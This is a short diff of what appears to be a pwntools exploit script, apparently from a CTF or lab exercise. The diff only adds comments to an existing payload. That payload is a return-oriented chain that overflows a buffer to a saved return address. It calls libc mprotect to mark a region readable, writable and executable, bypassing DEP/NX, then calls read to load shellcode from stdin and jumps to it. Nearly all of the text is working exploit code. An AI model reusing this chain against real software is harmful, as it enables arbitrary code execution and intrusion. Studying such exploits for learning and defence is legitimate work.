@@ -42,18 +42,18 @@ success("Found libc read value: %#x", libc_mprotect)
 
 #bypass DEP NX using mprotect from libc
 payload = cyclic(eip_offset)
-payload += p32(libc_mprotect)
+payload += p32(libc_mprotect) 
 payload += p32(pop3ret)
 payload += p32(shellcode_addr)
-payload += p32(0x100000)
-payload += p32(0x7)
+payload += p32(0x100000) #mprotect size
+payload += p32(0x7) #mprotect RXW permission
 
 #read shellcode using read from libc
 payload += p32(libc_read)
 payload += p32(pop3ret)
-payload += p32(0x0)
+payload += p32(0x0) #stdin fd
 payload += p32(shellcode_addr)
-payload += p32(1024)
+payload += p32(1024) #read size
 
 #execute shellcode onto the stack
 payload += p32(shellcode_addr)
